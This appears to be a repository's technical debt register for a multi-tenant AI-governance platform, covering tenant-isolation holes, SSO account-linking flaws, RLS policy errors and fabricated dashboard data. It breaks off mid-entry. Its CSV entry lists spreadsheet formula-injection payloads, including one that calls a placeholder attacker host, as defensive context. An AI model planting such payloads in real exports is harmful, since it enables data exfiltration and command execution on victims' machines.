# Technical Debt Register

> Debt that is not written down does not exist, and will be rediscovered by an
> auditor instead of by us. Every accepted shortcut belongs here with an owner
> and a reason — see [`../contributing/review-process.md`](../contributing/review-process.md).

Last reviewed: 2026-08 (second-pass security audit — Sentinel Threat Review)

---

## TD-025 — Self-host FastAPI backend lacks tenant scoping (audit H2/H3/M1/M4)

**Owner:** backend. **Severity:** High *for the self-hosted deployment path*.
The second-pass audit found the `sentinel/` FastAPI backend enforces
authentication (a valid bearer) but **not tenant isolation**: `main.py`'s
`_require_api_auth` never checks the token's tenant against the record, and
several routers add no scoping of their own —

- `rbac_router`, `trust_engine_router`, `reg_radar_router`,
  `observability_router`, `shadow_ai_router`, `questionnaire_router` — no
  `tenant_id` on the model or in any query, plus raw-dict mass assignment
  (`Model(**data)` / `setattr`). Any authenticated user can cross tenants
  (e.g. `PATCH /api/rbac/users/{id}` → self-grant Super Admin; read another
  tenant's `TrustTrace` prompts/responses).
- `tasks_router` / `evals_router` hardcode `_get_tenant_id() → "default-tenant"`.
- `controls_router.add_test_result` writes evidence + effectiveness score with
  no tenant check (`WHERE id=$2`, no `tenant_id`).
- `dataset_router:80` / `agent_router:89` — scoped UPDATE followed by an
  unscoped `SELECT * WHERE id=$1`, a read-only IDOR.

**Deployment context (why not fixed this pass):** the managed SaaS plane is
Cloudflare Workers (dashboard) + Supabase (Postgres/RLS/edge functions) — the
dashboard build ships no `VITE_API_URL`, so this FastAPI is **not deployed
there**. It is the self-hostable open-core API: it appears only in
`docker-compose.yml`, bound to `127.0.0.1:8000` (loopback) with its own
Postgres. So these are real vulnerabilities for anyone self-hosting the API
multi-tenant, but not live on the managed plane and not internet-exposed by
default. **Exit:** thread a tenant filter through the shared middleware (resolve
tenant from the JWT and enforce it), give the SQLAlchemy models a `tenant_id`,
and replace raw-dict assignment with explicit field lists — a dedicated pass,
gated on confirming who runs the self-hosted API multi-tenant. Full write-up:
Sentinel Threat Review (H2/H3/M1/M4).

---

## TD-024 — SSO callback links accounts by bare email (audit H1)

**Owner:** platform / SSO. **Severity:** High (Critical-class, currently gated).
`_shared/sso.ts jitProvision` links an existing Supabase user *globally by
email* and force-overwrites their `org_id`/`provider_id`, with **no
`email_verified` check**, no binding by `(provider_id, sub)`, and no
consultation of `identity_provider_domains.is_verified` (a domain-ownership
table that exists for exactly this). Combined with an `identity_providers`
INSERT policy that lets any org member self-register a provider with
attacker-controlled `issuer`/`jwks_uri`/`token_endpoint`, a malicious IdP could
assert `email: victim@bigcorp.com` and take over that account across tenants.
**Gating:** the callback requires a validly HMAC-signed `state`, and no in-repo
endpoint mints one — the login-initiation path is external/unshipped — so
end-to-end exploitation is not currently reachable from this repo. The trust
boundary is nonetheless broken by design. **Exit (before any SSO GA):** require
`email_verified === true` and a verified domain owned by the provider's org;
bind identity by `(provider_id, sub)`, not email; admin-gate provider
registration. Also **L5** (release.yml holds `issues`/`pull-requests: write`
job-wide) — narrowing it safely needs `successComment:false`/`failComment:false`
in `.releaserc`; deferred to avoid destabilising the freshly-fixed release
pipeline. Full write-up: Sentinel Threat Review.

---

## TD-023 — CSP keeps `style-src 'unsafe-inline'` (accepted residual)

**Owner:** frontend. **Reason:** the dashboard renders with React inline
`style={{…}}` props in the thousands; a nonce/hash-based style policy cannot
cover attribute-level inline styles, so `style-src 'self' 'unsafe-inline'` is
retained across all three CSP fronts (`public/_headers`, `wrangler.toml`,
`nginx.conf`). This is scoped to **styles only** — `script-src` carries no
`'unsafe-inline'`, so script injection remains blocked, and style injection
cannot execute code. Documented in
[`../security/content-security-policy.md`](../security/content-security-policy.md).
**Exit:** migrate high-traffic surfaces off inline styles (or to CSS modules /
a nonce-able `<style>` strategy), then drop the directive. Not blocking.

---

## TD-021 — Hand-rolled CSV exports are formula-injection-prone (CWE-1236)

**Status:** Open (2 of ~24 fixed) · **Severity:** P2 (security) · **Found by:** enterprise-tables pass, 2026-09

The dashboard has ~24 "Export CSV" buttons, each hand-rolling the serialisation
inline. Two failure modes recur:

1. **Formula injection.** A cell whose text begins with `= + - @` (or a
   tab/CR) is executed as a formula by Excel and Google Sheets when the file is
   opened — `=WEBSERVICE("http://attacker")`, `=HYPERLINK(...)`, `=cmd|...`. Many
   exported fields are attacker-influenceable: a vendor name, an owner, an
   evidence title or a resource tag synced from a connected integration. A GRC
   platform handing an auditor a spreadsheet that runs an attacker's formula is
   the exact failure it exists to prevent.
2. **Quoting.** Several exporters quote only some columns (e.g. `JSON.stringify`
   on name/owner but raw on category), so a comma or newline in an unquoted
   field corrupts the row.

**The fix exists:** `dashboard/src/lib/csv.ts` (`toCsv` / `downloadCsv`) escapes
every formula trigger by prefixing `'` (neutralises the formula, preserves the
displayed text) and quotes every field per RFC 4180, with a UTF-8 BOM. It is
unit-tested against the injection vectors. **Migrated so far:**
`ModelRegistryPage.tsx`, `vendors/VendorRegistry.tsx`.

**Remaining (~22), each to route through `downloadCsv`:** `EvidenceVault.tsx`,
`vendors/VendorSLA.tsx`, `vendors/VendorAssessments.tsx`, `VendorUpload.tsx`,
`EsgReports.tsx`, `AibomRegistry.tsx`, `CarbonLedger.tsx`, `EnergyEfficiency.tsx`,
`ModelEfficiency.tsx`, `ConsentManagement.tsx`, `DsrManagement.tsx`,
`EthicsReporting.tsx`, `training/TrainingAwareness.tsx`,
`continuity/BusinessContinuity.tsx`, `data-governance/DataGovernancePage.tsx`,
`maturity/BenchmarkingMaturity.tsx`, `rbac/UsersPage.tsx`,
`rbac/DepartmentsPage.tsx`, `security/ModelArena.tsx`,
`trust-engine/{CostTokenDashboard,LiveTraceFeed,FallbackLog,ToolCallMonitor}.tsx`.

**Owner:** frontend. **Why not fixed in one pass:** 22 heterogeneous call sites,
each with its own column set; migrating them unreviewed in a single overnight
change risks silent column/order regressions in audit exports. They are being
migrated incrementally as each page is next touched; the shared util means each
migration is a few lines and closes the hole for that page.

---

## TD-000 — Cross-tenant RLS holes (FIXED 2026-08-16, retained as a lesson)

**Status:** Closed · **Severity:** P0 (security) · **Found by:** Gate 4 sweep

Four real tenant-scoped tables — `webhook_endpoints`, `agents`,
`shadow_ai_findings`, `executive_digests` — each carried a correct org-isolation
policy **and** a second PERMISSIVE policy with predicate `true` (or an
`auth.role()` check with no tenant condition) for the `authenticated` role.

Postgres **OR-combines** permissive policies, so the second policy silently
widened access past the first. Any authenticated user in any organisation could
read — and in three cases write — every other tenant's rows.

**Why this is the important entry in this register:** RLS was *enabled* on all
four tables the entire time. "RLS is on" is therefore not a sufficient assurance
statement, and neither is "an isolation policy exists". The only sound check is
that **no permissive policy lacks a tenant predicate**.

All four tables were empty when found, so this closed a latent hole rather than
an active exposure. Fixed in `supabase/migrations/20260816000007_fix_cross_tenant_rls.sql`,
which carries a regression query to re-run after any RLS change. That query is
now part of Gate 4.

---

## TD-003 — Five different org-resolution helpers

**Status:** Open · **Severity:** P2 · **Owner:** Platform team

RLS predicates across the schema resolve the caller's organisation five
different ways:

| Helper | Used by (examples) |
|---|---|
| `current_user_org_id()` | `integrations`, `mcp_servers`, `mcp_tools`, `tasks`, `eval_techniques` |
| `get_org_id()` | `assets`, `audit_log`, `roles`, `bia_records`, `ropa_records` |
| `get_user_org_id()` | `ai_models`, `departments`, `user_profiles`, `model_versions` |
| `current_setting('app.current_org_id')` | `agent_registry`, `evidence_chain`, `governance_events` |
| `auth.jwt() ->> 'org_id'` | `agent_registry` (read), `governance_events` (read) |

`ai_models` and `agent_registry` each carry **two** isolation policies using
*different* helpers. If the helpers ever disagree — different fallback on null,
different source of truth — the OR-combination means the **more permissive one
wins**, which is precisely how TD-000 happened.

Converge on a single helper, then assert the others are unused. Until then,
every new RLS policy must use `current_user_org_id()`.

---

## TD-004 — Remaining agents still write unmapped columns

**Status:** Open · **Severity:** P1 · **Owner:** Governance mesh

`riskAssessmentAgent` and `hitlAgent` were corrected on 2026-08-16 to write the
real column names on `risks`, `hitl_reviews` and `tasks` (both verified with a
rolled-back insert against the from-zero replayed schema, not only the live
DB — the live DB carries era-drift columns like `risks.assessment_date` and
`tasks.sla_due_at` that a fresh deployment does not have). The telemetry
repair wave additionally corrected `notificationAgent`, `regulatorNotifyAgent`,
`complianceMappingAgent`, `incidentResponseAgent` and the sweep sentinels
against their target tables. The remaining registered agents have **not**
been verified against their target schemas.

`safeInsert` catches an insert error, logs a console warning and returns null,
so a mismatched agent fails silently — the cascade appears to run, the agent
reports a status, and no record is written. This is the same fake-success class
as TD-001, but in the autonomous layer where nobody is watching a toast.

Verify each remaining agent's insert against `information_schema.columns` and
correct the mapping. The two fixed agents are the reference. Consider making
`safeInsert` return a discriminated result so an agent can fail loudly rather
than logging and continuing — `hitlAgent` now checks its result explicitly and
returns `failed` rather than emitting an event for a review that was never
recorded.

---

## TD-001 — ~~Modules still reading generic demo tables~~ (CLOSED, 19/19 migrated)

**Status:** CLOSED (2026-08-19) · **Severity:** was P0 · **Owner:** Platform team

### What

Nineteen modules formerly read a generic `<name>_table (id, doc jsonb)` demo
table via `useSupabaseTable(...)`, seeded from a hardcoded in-file array. This
violated the platform's first-principle contract (*"Never wire a page to a
generic `<name>_table (id, doc jsonb)` demo table"*) in `CLAUDE.md`.
**All 19 are now migrated and `useSupabaseTable` has been deleted from the
codebase.**

### Why it matters

These are not cosmetic. A module on a demo table typically also:

- **fakes success** — mutations write to local state and toast success whether or
  not anything persisted;
- **escapes org scoping** — the demo table has no `org_id` default and no RLS
  isolation policy, so tenancy is not enforced by the schema;
- **displays seeded values as real** — a compliance figure that was never
  measured is indistinguishable from one that was.
- **has no tenant column at all** — every `*_table` demo table carried an
  `_authenticated_all` policy with predicate `true`, so all of them were
  readable and writable by any authenticated user in any organisation. They were
  excluded from the TD-000 regression query only because they had no tenant
  column to check; that was a reason to migrate them, not to exempt them.

> **Containment claim of 2026-08-16 retracted — it never held on live.** The
> first attempt (`20260822000002_supply_chain_esg_canonical.sql` §9) added
> `org_id uuid NOT NULL DEFAULT current_user_org_id()` in one statement. Under
> a migration/admin role that resolver returns NULL, and adding a NOT NULL
> column with a NULL default to a populated table aborts with *"column
> contains null values"* — so on the live database the whole DO block rolled
> back and every blanket `authenticated USING (true)` grant survived,
> `keysvault_table` included. A from-zero replay has no rows, so CI passed,
> and the "verified 53/53" numbers previously recorded here were read from a
> fresh replay / the migration file — not from the database that matters.
> Two independent re-audits (2026-08-17 and the 2026-08-23
> production-readiness review) each re-ran the verification against live and
> found 0/53 columns present with all blanket grants active. Lesson bound
> into the review process: a verification claim must cite the query **and the
> context it ran in**.
>
> **Containment re-applied and verified against live, 2026-08-23.** Two
> convergent migrations now carry it — `20260823000005` §2 (nullable add →
> explicit backfill to the demo tenant → `SET NOT NULL` → org-scoped policy)
> and `20260823000002_reaudit_critical_fixes.sql` (same shape, per-table
> error isolation, leaves genuinely unattributable rows NULL so the policy
> excludes rather than misassigns them). Both are idempotent; the later file
> is the durable form. Verified live via `pg_policies` /
> `information_schema`: 53/53 columns, 53/53 org policies, 0 blanket grants
> remaining. **Containment is still not remediation** — the modules below
> render seeded fiction through `useSupabaseTable`, whose writes are
> fire-and-forget with both callbacks empty and which silently falls back to
> the in-file `SEED` when a load fails. They still need real tables and
> throwing services.

For a product used as the system of record for AI Act and ISO/IEC 42001
conformity, the third point is the serious one: a regulator may rely on a number
that has no provenance.

### Affected modules

| Module | Page | Demo table |
|---|---|---|
| ~~Asset Management~~ | ~~`pages/AssetManagement.tsx`~~ | **migrated** → `assets` (2026-08-23) |
| ~~Business Impact Analysis~~ | ~~`pages/BIA.tsx`~~ | **migrated** → `bia_processes` (2026-08-23) |
| ~~DPIA~~ | ~~`pages/DPIA.tsx`~~ | **migrated** → `useDpiaRecords` hook / `dpia_records` table |
| ~~Identity Governance (IGA)~~ | ~~`pages/IGA.tsx`~~ | **migrated** → `identities` + `sod_*` + `access_reviews` (2026-08-23) |
| ~~Model Risk Committee~~ | ~~`pages/ModelRiskCommittee.tsx`~~ | **migrated** → `mrc_meetings` / `mrc_agenda_items` / `mrc_votes` / `mrc_committee_members` (2026-08-25) |
| ~~Regulator Filings~~ | ~~`pages/RegulatorFilings.tsx`~~ | **migrated** → `useFilings` hook / `regulator_filings` table |
| ~~Tabletop Exercises~~ | ~~`pages/TabletopExercises.tsx`~~ | **migrated** → `useTabletops` hook / `tabletop_exercises` + `playbooks` tables |
| ~~Transparency Reports~~ | ~~`pages/TransparencyReports.tsx`~~ | **migrated** → `useTransparencyReports` hook / `transparency_reports` table |
| ~~Committee Management~~ | ~~`pages/ModelRiskCommittee.tsx`~~ | **migrated** → `useMrc` hook (same as MRC above; no separate committee page exists) |
| ~~Regulatory Radar~~ | ~~`pages/governance/RegRadar.tsx`~~ | **migrated** → `useRegulationEntries` hook / `regulation_entries` table |
| ~~HITL Review Center~~ | ~~`pages/hitl/HITLReviewCenter.tsx`~~ | **migrated** → `useHitlReviews` hook / `hitl_reviews` table |
| ~~Reporting~~ | ~~`pages/reporting/Reporting.tsx`~~ | **migrated** → `security_reports` / `security_report_runs` (2026-08-25) |
| ~~Attack Surface~~ | ~~`pages/security/AttackSurface.tsx`~~ | **migrated** → `useAssets` hook / `attack_surface_assets` table |
| ~~Keys Vault~~ | ~~`pages/security/KeysVault.tsx`~~ | **migrated** → `useKeys` hook / `api_keys` table |
| ~~Policy Firewall~~ | ~~`pages/security/PolicyFirewall.tsx`~~ | **migrated** → `useFirewall` hook / `policy_firewall_rules` table |
| ~~Red Team Lab~~ | ~~`pages/security/RedTeamLab.tsx`~~ | **migrated** → `useCampaigns` hook / `red_team_campaigns` table |
| ~~Report Generator~~ | ~~`pages/security/ReportGenerator.tsx`~~ | **migrated** → `useReports` + `useReportRuns` hooks / `security_reports` table |
| ~~Vendor Assessments~~ | ~~`pages/vendors/VendorAssessments.tsx`~~ | **migrated** → `vendor_assessments` (2026-08-16) |
| ~~Vendor SLA~~ | ~~`pages/vendors/VendorSLA.tsx`~~ | **migrated** → `vendor_slas` (2026-08-16) |
| ~~AIBOM Registry~~ | ~~`pages/AibomRegistry.tsx`~~ | **migrated** → `aibom_records` (2026-08-16) |
| ~~Supply Chain Attestations~~ | ~~`pages/SupplyChainAttestations.tsx`~~ | **migrated** → `supply_chain_attestations` (2026-08-16) |

> **Final-wave migration (2026-08-25, `20260825000003_last_demo_table_retirement.sql`).**
> Asset Registry, BIA, Identity Governance (Access Reviews), Model Risk
> Committee and Reporting migrated off their demo tables onto the real
> org-scoped tables that already existed. No table was created for their core
> data; the only new table is `mrc_committee_members` (the committee roster,
> previously kept in `modelriskcommittee_table`'s jsonb with no tenant column
> and seeded from seven hardcoded names in the page file — so every quorum
> badge the product ever rendered was computed from fiction).
>
> **The MRC interlink was broken *and invisible*.** On a from-zero replay,
> `mrc_agenda_items.model_id` and `mrc_votes.model_id` resolved to **0 of 12**
> `ai_models` rows — the AIIA seed wrote model uuids that exist in no registry
> row, and the tables' denormalised `model_name` made every pill render a
> plausible name over a dead link. `model_id` was also `text` with no foreign
> key, so any string was a legal reference. The migration converts it to `uuid`,
> re-resolves each reference by name against `ai_models` (nulling what does not
> resolve — never inventing), then adds the FK so a fabricated id is rejected by
> the database. Post-migration: **agenda items 4/4, votes 8/8 resolve**, and
> `insert … model_id='ffffffff-…'` now raises
> `violates foreign key constraint "mrc_agenda_items_model_id_fkey"`.
>
> Demo `*_table` rows are **not** dropped (other environments may hold rows);
> the pages simply stop reading them. Evidence: `git`-tracked migration +
> from-zero replay (124 migrations, 0 failures); services throw on failure and
> call `logAction`; `npx tsc --noEmit` clean; `npx vitest run` 266/266.

> **Register correction (2026-08-16).** `aibomregistry_table` and
> `supplychainattestations_table` were **absent from this table** until the
> supply-chain audit found them, despite being created by the same batch as the
> listed entries (`20260711000002_wire_unwired_crud_doc_tables_batch2.sql`).
> Per CLAUDE.md, *"undocumented debt does not exist and will be found by an
> auditor instead of by us"* — they were, and both are now migrated. When adding
> a demo table, add its row here in the same change.

### Remediation priority

Ordered by regulatory exposure — how directly a fabricated record in that module
would mislead an assessor:

**Tier 1 — statutory records** — ALL MIGRATED.
`DPIA` → `useDpiaRecords`; `Regulator Filings` → `useFilings`;
`HITL Review Center` → `useHitlReviews`.
(`RoPA`, `TIA` and `Compliance Controls` migrated 2026-08-16.)

**Tier 2 — governance process records** — ALL MIGRATED.
`Committee Management` → `useMrc` (same page as MRC);
`Tabletop Exercises` → `useTabletops`; `Transparency Reports` → `useTransparencyReports`.
(`Model Risk Committee` migrated 2026-08-25; `BIA` migrated 2026-08-23;
`Vendor Assessments` and `Vendor SLA` migrated 2026-08-16.)

**Tier 3 — operational surfaces** — ALL MIGRATED.
`Report Generator` → `useReports`/`useReportRuns`; `Regulatory Radar` → `useRegulationEntries`;
`Attack Surface` → `useAssets`; `Keys Vault` → `useKeys`;
`Policy Firewall` → `useFirewall`; `Red Team Lab` → `useCampaigns`.
(`Asset Management` and `IGA` migrated 2026-08-23; `Reporting` migrated 2026-08-25.)

> **CLOSED 2026-08-19.** All 19 modules migrated across four waves (2026-08-16,
> 2026-08-23, 2026-08-25, and incremental service hookups). The `useSupabaseTable`
> hook has been deleted from the codebase — verified by `grep -r useSupabaseTable`
> returning zero matches across the entire repo. Every page now reads from a
> dedicated React Query hook backed by a real org-scoped Supabase table with RLS.

### Known-good remediation pattern

Six modules have already been migrated off this pattern; follow the same shape:

1. Check whether a **real table already exists but is unused** — this was true
   for `eval_techniques` (existed, zero rows, never read) and `webhook_endpoints`
   (existed, no UI, no RLS). Extend the real table rather than creating a
   competing one.
2. Create/extend the org-scoped table: `org_id uuid not null default
   current_user_org_id()`, RLS enabled, isolation policy on both `using` and
   `with check`, `is_deleted` for soft delete.
3. Write a service on the contract: camelCase↔snake_case mapping, writes
   **throw**, reads surface real errors, `logAction` on every mutation.
4. Write a React Query hook that invalidates on mutation.
5. Rebuild the page on platform primitives with all three of
   skeleton/empty/error, and interlink it in both directions.
6. Prove the interlinks with a query (`total` must equal `resolves`) and record
   the result.

Reference implementations: `integrationsService.ts`, `mcpService.ts`,
`evalTechniqueService.ts`.

### Why not fixed in one pass

Each module is a genuine backend build (table, RLS, seeds, service, hook, page
rewrite, interlinks, docs, compliance mapping) — roughly the scope of the
Integrations or MCP work, times twenty-two. Batching them into a single change
would produce a diff no reviewer could meaningfully assess against the four
gates, which is itself a compliance risk. They are therefore sequenced by tier.

---

## TD-002 — `Benchmark` page shares the Validation Lab dataset

**Status:** Open · **Severity:** P3 · **Owner:** Evals

`pages/Benchmark.tsx` reads `validationRunHooks.useList()` — the same dataset as
the Validation Lab — and presents a scored view over it. This is defensible
(Benchmarks *is* a view over completed runs) but the relationship is implicit.
Either give it its own scoring/benchmark records, or document it explicitly as a
derived view so it is not mistaken for an independent evidence source.

---

## TD-005 — `fn_audit_trigger` silently drops audit rows on tables lacking `name`/`title`

**Status:** Open · **Severity:** P1 (audit integrity) · **Owner:** Platform team

`fn_audit_trigger` builds its audit-log entry from `new.name` / `new.title`.
On tables that carry **neither** column (e.g. `approvals`,
`policy_acknowledgments`), the trigger errors internally and the audit row is
**silently swallowed** — the business write succeeds, the trail entry does
not. This is platform-wide and predates the 2026-08-16 controls/evidence
wave: any table wired to `trg_audit` without a `name` or `title` column has an
incomplete Art. 12 trail while appearing fully instrumented. Fix direction:
make the trigger resolve the display label defensively
(`coalesce(to_jsonb(new)->>'name', to_jsonb(new)->>'title', new.id::text)`)
so a missing column degrades to the id instead of dropping the row, and add a
regression query that walks `pg_trigger` for `trg_audit` tables lacking both
columns.

---

## TD-006 — `controls` carries triplicated business-code and clause columns

**Status:** Open · **Severity:** P2 · **Owner:** Compliance platform

The `controls` table accumulated three business-code columns
(`control_id`, `control_ref`, `code`) and three clause columns
(`clause`, `clause_ref`, `clause_reference`) across eras, plus paired
date/text test columns (`last_tested_date`/`last_tested`/`last_tested_at`,
`next_test_date`/`next_test_at`). Readers coalesce
(`control_ref ?? control_id`, `clause_ref ?? clause_reference ?? clause`),
which works but means a writer that fills only one column is invisible to a
reader that checks another first. Canonical set going forward:
`control_ref`, `clause_ref`, `last_tested_at`, `next_test_at` (what
`controlService.ts` writes). Migration direction: backfill the canonical
columns from the legacy ones, then drop the legacy columns behind a view or
leave them nullable-and-unwritten with a schema comment.

---

## TD-007 — Two parallel evidence-custody ledgers; ws04 explorer unreachable

**Status:** Open · **Severity:** P2 · **Owner:** Evidence/Trust

Evidence custody exists twice: the `evidence_chain` hash-chain ledger read by
the Evidence page's Chain tab, and the ws04 `evidence_artifacts` +
`evidence_custody_events` pair behind `/evidence/custody/:artifactId`
(`EvidenceCustodyExplorer.tsx`). Both artifact tables are empty on the
replayed schema, no producer writes them, and **nothing links to the explorer
route** — it is unreachable except by typing a URL, and it would render
against empty tables. A planned Chain-tab inbound link was deliberately NOT
added on 2026-08-16 because it would deep-link into an empty, producer-less
module. Consolidation direction: fold custody onto `evidence_chain` (the
ledger that actually receives writes), port anything the explorer UI does
better into the Chain tab, and retire `evidence_artifacts` /
`evidence_custody_events` and the orphan route in the same change.

---

## TD-008 — Conformity / Frameworks writes lack Art. 12 audit logging

**Status:** Open · **Severity:** P2 · **Owner:** Compliance platform

The 2026-08-16 compliance elevation added `logAction` (EU AI Act Art. 12
traceability) to `complianceOpsService`, `evidenceService`, `policyService`,
`oversightService` and `regulatoryOpsService`, and DB-side `trg_audit` covers
`controls`, `evidence`, `policies`, `policy_acknowledgments` and the audit
tables. `conformityService` and `frameworkService` still write without a
`logAction` call, and their tables carry no `trg_audit`, so marking a
conformity assessment complete or editing a framework leaves no audit row.
Add `logAction` on their save/delete paths (the `dpiaService` pattern) or
extend `trg_audit` to `conformity_assessments` and `frameworks`.

---

## TD-009 — Main Overview fabricated dashboard sections (CLOSED 2026-08-17)

**Status:** Closed · **Severity:** was P2 — should have been P0 · **Owner:** Platform team

> **Closed 2026-08-17.** All eight listed sections are resolved: deleted where
> nothing could back them (SLA countdown, cross-module dependency SVG, trust
> score, governance coverage matrix) or derived from a real org-scoped query
> (supply-chain provenance from `supply_chain_attestation_status` × `ai_models`,
> shadow AI and kill-switch gates from `agent_gov_registry`, the heat map from
> `ai_models.risk_tier × lifecycle_stage`, the calendar from
> `compliance_calendar`). "System Operational" is now computed from the page's
> own eleven queries and can report "N of 11 data sources unavailable".
>
> **The severity was wrong, and that is the lesson worth keeping.** This was
> filed as P2 "display-only invented data". Two of the entries were not
> cosmetic: `94.2% — 48 of 51 production models carry verified cryptographic
> AIBOM attestations` was a fabricated *attestation* claim — the first thing an
> auditor would test — sitting directly above a working link to the real AIBOM
> register that would have shown a different number; and the hardcoded trust
> score of `86` collided with the genuine 0.0–1.0 verifier composite documented
> in `trust-score.md`, so the same term meant two different things in one
> product. Invented data on the page every customer and auditor opens first is
> not P2, whatever its render path.

The 2026-08-16 audit-consolidation wave removed the fabricated Recent Activity
feed, regulatory scorecard, alert items and synthesized trend arrays from
`pages/Overview.tsx`, replacing them with real derivations. Several hardcoded
sections remain and are display-only invented data (no measurement provenance):
the SLA Countdown table (`REM-00x`), the Cross-Module Dependency Map SVG
(`MDL-001` business codes), the Model Risk Heat Map, the Real-Time Trust Score
(86), the Compliance Calendar strip, the AI System Governance Coverage table,
the supply-chain / shadow-AI / kill-switch stat cards, and the hardcoded
"System Operational" badge. Each should be derived from its real source
(risks, remediation_plans, compliance_calendar, ai_models) or removed with an
honest empty state — the same treatment the removed sections received.

---

## TD-010 — Tables created after the one-time `GRANT ... ON ALL TABLES` sweep

**Owner:** platform / DB · **Raised:** 2026-08-16 (TPRM rollout)

`20260420160001_functional_integration.sql:303` runs
`grant select, insert, update, delete on all tables in schema public to
authenticated` **once**. It cannot reach a table created by a later migration.
Live Supabase projects paper over this with ambient
`ALTER DEFAULT PRIVILEGES ... GRANT ALL ON TABLES TO authenticated`, so the gap
is invisible in production — but on a from-zero replay in a bare Postgres, every
table created after that sweep is unwritable (`permission denied`), which is
exactly what a self-hosted or air-gapped deployment gets.

Confirmed unwritable on a bare from-zero replay (Postgres 16.13):
`financial_risks` (Risk & Incidents rollout), `policy_templates`,
`policy_acknowledgments`, `post_market_plans` (Compliance rollout).

The tables added by this change grant explicitly and are unaffected. The fix for
the rest is either a repeat sweep in a new migration or, better, an
`ALTER DEFAULT PRIVILEGES` statement committed to the repo so the guarantee is
in version control rather than in a hosting provider's bootstrap.

---

## TD-011 — Supply-chain and TPRM modules assert unperformed verification

**Owner:** supply chain · **Raised:** 2026-08-16 · **Partially addressed**

The audits found four modules claiming assurance nothing had performed: an AIBOM
"SHA-256" generated by `Math.random()` that fed an integrity PASS; a
"Signature Valid" check implemented as `sigHash !== 'PENDING'` against a
free-text field, under a heading reading *Cryptographic Verification*; a
hardcoded signer (`'James Liu'`); and `verified` booleans that were seed
literals.

**Addressed in this change:** every one of those claims is removed. The schema
now separates `declared_digest` (self-declared, evidence of nothing) from
`verification_status` / `verified_at` / `verified_by` / `verification_method`,
and carries the fields real signing needs (`signature` DSSE envelope,
`signer_identity`, `rekor_log_index`).

**Remaining debt:** no verification is actually performed —
`verification_status` stays `'unverified'` for every record. Closing this means
server-side digest computation over the canonical BOM document and DSSE/Sigstore
signing with key custody, which is its own change. Until then the UI must never
present an unverified record as verified.

---

## TD-012 — Shadow model/vendor/policy id-space in seed data (mostly closed)

**Owner:** Platform team · **Raised:** 2026-08-25 · **Severity:** P0 ·
**Status:** Closed for `model_id`; residual follow-up on `transfer_impact_assessments`.

### What

A resolution sweep of every `*_id` uuid/text column against its target table
(`scripts/` ad-hoc; reproduced in the migration's §8 proof block) found model,
vendor and policy references living in a **parallel id-space that resolved to
nothing**. Three illegal shapes were in use, all forbidden by First principle
#2 (*"Models are keyed by `ai_models.id` (uuid) everywhere — never by name,
slug, or a business code like `MDL-001`"*):

1. **Fabricated uuids** — e.g. `83a20820-…` meaning "Credit Risk Scorer" in
   nine tables, belonging to no `ai_models` row.
2. **Business codes** — `MDL-001`, `MDL-002`, `NEP-001`.
3. **Version slugs** — `credit-scoring-v3-2-1`, `nlp-sentiment-v1-5`.

At its worst, `mrc_agenda_items.model_id` and `mrc_votes.model_id` resolved to
**0 of 12** real models, while a denormalised `model_name` column rendered a
plausible label over the dead link. Across the platform the sweep found ~72
model references, plus `vendor-00N` codes in `ai_apps` /
`transfer_impact_assessments` and 52 fabricated `policy_id`s in
`guardrail_events` / `live_traces`, none resolving.

### Why it survived six audit waves

The shadow space was **internally consistent** — the same fabricated uuid meant
the same model in every table that cited it — so each module looked correct in
isolation and even joined to its siblings. It only broke on the one join that
matters: to `ai_models`. Audits that asked *"does this page look honest?"*
passed it; only *"where does this id actually resolve?"* caught it.

### Root cause

Structural, not editorial: **14 of the 15 `model_id` columns were `text` with
no foreign key.** A text column with no referent silently accepts a slug, a
business code, or a typo. Remapping rows without fixing the column type would
let the shadow space grow straight back.

### Addressed

`20260825000004_unify_model_id_space.sql` (and, for MRC specifically,
`20260825000003`) remaps each reference to the real id by its name label,
**NULLs** whatever still does not resolve (a null renders "Unavailable" — a
dangling pointer renders a lie; no model is invented to point at), converts the
columns `text → uuid`, and adds `REFERENCES ai_models(id)` / `vendors(id)` /
`policies(id)`. Shapes (2) and (3) are now a type error; shape (1) is an FK
violation. Proven on a from-zero Postgres 16 replay: every remaining reference
resolves (`total = resolves` on all 27 columns), and a re-inserted `MDL-001` /
fabricated uuid is rejected by the DB.

### Remaining debt

`transfer_impact_assessments.vendor_id` carried `vendor-00N` codes but the table
holds no name or app label to bridge from, so those rows were NULLed and the
column constrained. Authoring meaningful demo linkage for TIA vendors (which
supplier each cross-border transfer assessment covers) is deferred — the column
and FK exist and are enforced; only the demo attribution is absent.

---

## TD-015 — 30% of tables are invisible to the replay checker's column verification

**Owner:** Platform · **Raised:** 2026-08-28 · **Severity:** P2 ·
**Status:** Open, now *measured* rather than silent.

### What

`scripts/check_migration_replay.py` verifies that a column referenced by a
migration actually exists — but only for tables whose **literal `CREATE TABLE`**
it parsed. Tables created inside a dynamic loop:

```sql
execute format($f$ create table if not exists public.%I ( … ) $f$, t);
```

never present one. The checker learns their columns only from later `ALTER`s,
so it cannot verify a reference against them. `20260420160001_functional_
integration.sql` creates **31 tables** this way, and the legacy `<name>_table`
demo tables add more.

As of this entry: **81 of 268 tracked tables (30%)** are in this state. The
checker now prints the full list on every run, so the gap is visible in CI logs
instead of being implied away by "replay check clean".

### Why it matters — this is not theoretical

Every one of the four broken write paths repaired in
`20260827000001_org_scoping_defaults_repair.sql` was on a dynamically-created
table:

| Table | Defect that survived every gate |
| --- | --- |
| `bcp_plans` | service sent `tenant_id`; table has only `org_id` |
| `departments` | same, plus `org_id` was NOT NULL with no default |
| `red_team_findings` | same |
| `training_courses` | same |

A client sending a column that does not exist is exactly what this checker is
meant to catch. It could not, because these tables were never fully known to
it — which is why the bug survived six audit waves and was found only by
reading the schema directly against a live Postgres.

The same gap explains the three tables recorded as **unverified** in PR #78:
`attack_surface_assets`, `ethics_reports` and `policy_firewall_rules` are all in
the dynamic set, and all three still inject `tenant_id` from their services.
**They are the most likely place the next instance of this bug lives.**

### To close

Options, cheapest first:

1. **Verify the three known suspects** against a real Postgres and repair them
   the same way as the four above. This is the immediate, bounded action.
2. **Teach the checker to parse the dynamic template.** The loop's `create
   table` body is a literal inside `format()`; parsing it once and applying it
   to every table in the array would move all 31 into `fully_known`.
3. **Retire the dynamic creator.** Replace the loop with explicit `CREATE TABLE`
   statements. Most verbose, but it makes the schema readable and every table
   checkable — and these tables have since diverged anyway, so the shared
   template no longer describes them.

Until one of these lands, treat "replay check clean" as *"clean for the 187
tables it can actually see"*.

---

## TD-016 — `ws02_catalog_read` leaves seven tenant tables world-readable

**Owner:** Platform team · **Raised:** 2026-08-18 · **Severity:** P0 (security) ·
**Status:** **Policies fixed** in
